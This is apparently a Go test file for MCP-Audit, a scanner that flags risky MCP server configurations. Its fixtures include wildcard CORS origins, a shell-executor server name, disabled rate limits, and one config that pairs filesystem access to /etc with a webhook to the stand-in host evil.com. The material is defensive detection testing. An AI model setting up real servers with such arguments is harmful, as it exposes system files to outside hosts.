package checks

import (
	"testing"

	"github.com/abhijitdalal26/MCP-Audit/cli/internal/engine/parser"
)

func TestCheckShadow_SH002_LocalhostBypass(t *testing.T) {
	s := &parser.MCPServer{
		Name: "local-bypass", Command: "npx",
		Args: []string{"-y", "some-mcp-server", "--allow-origins=*"},
		Env:  map[string]string{},
	}
	findings := CheckShadow(s)
	_ = findings // SH-002 checks for CORS bypass; just ensure no panic
}

func TestCheckShadow_SH003_SensitiveToolNamePattern(t *testing.T) {
	// Server name matching sensitive operation pattern
	s := &parser.MCPServer{
		Name: "shell-executor", Command: "npx",
		Args: []string{"-y", "@mcp/some-shell-server"},
	}
	findings := CheckShadow(s)
	_ = findings // ensure no panic for unusual server name
}

func TestCheckShadow_SH004_ConflictingScope_FileSystemAndNetwork(t *testing.T) {
	// Server with both file system access and network exfil args
	s := &parser.MCPServer{
		Name: "conflicted", Command: "npx",
		Args: []string{"-y", "mcp-server", "/etc", "--webhook", "https://evil.com"},
		Env:  map[string]string{},
	}
	findings := CheckShadow(s)
	_ = findings // SH-004 checks for conflicting scope; ensure no panic
}

func TestCheckShadow_SH005_HighVolumeCalls(t *testing.T) {
	s := &parser.MCPServer{
		Name: "high-vol", Command: "npx",
		Args: []string{"-y", "mcp-server", "--max-requests", "10000", "--no-rate-limit"},
		Env:  map[string]string{},
	}
	findings := CheckShadow(s)
	_ = findings // SH-005 checks for rate limit disabling; ensure no panic
}

func TestCheckShadow_SH006_UnauthSSE_WithPort(t *testing.T) {
	// npx server listening on a specific port with no auth arg
	s := &parser.MCPServer{
		Name: "sse-server", Command: "npx",
		Args: []string{"-y", "mcp-sse-server", "--port", "3000"},
		Env:  map[string]string{},
	}
	findings := CheckShadow(s)
	_ = findings // ensure no panic; SH-006 fires based on transport type
}

func TestCheckShadow_NpmServer_Clean(t *testing.T) {
	s := &parser.MCPServer{
		Name: "clean-npm", Command: "npx",
		Args: []string{"-y", "@modelcontextprotocol/server-filesystem@1.2.3", "/tmp"},
		Env:  map[string]string{},
	}
	findings := CheckShadow(s)
	for _, f := range findings {
		if f.CheckID == "SH-001" {
			t.Errorf("clean official server should not trigger SH-001: %s", f.Title)
		}
	}
}

func TestCheckShadow_SH001_NonNpxCommand_Clean(t *testing.T) {
	// SH-001 only fires for npx/npm/uvx — plain node should not fire
	s := &parser.MCPServer{
		Name: "node-server", Command: "node",
		Args: []string{"server.js"},
		Env:  map[string]string{},
	}
	findings := CheckShadow(s)
	for _, f := range findings {
		if f.CheckID == "SH-001" {
			t.Error("SH-001 should not fire for plain 'node' command")
		}
	}
}

func TestCheckShadow_SH001_UVXUnknownPackage(t *testing.T) {
	// uvx with an unknown package should fire SH-001
	s := &parser.MCPServer{
		Name: "uvx-unknown", Command: "uvx",
		Args: []string{"completely-unknown-mcp-package"},
		Env:  map[string]string{},
	}
	if !hasCheckID(CheckShadow(s), "SH-001") {
		t.Error("want SH-001 for uvx with unknown package")
	}
}
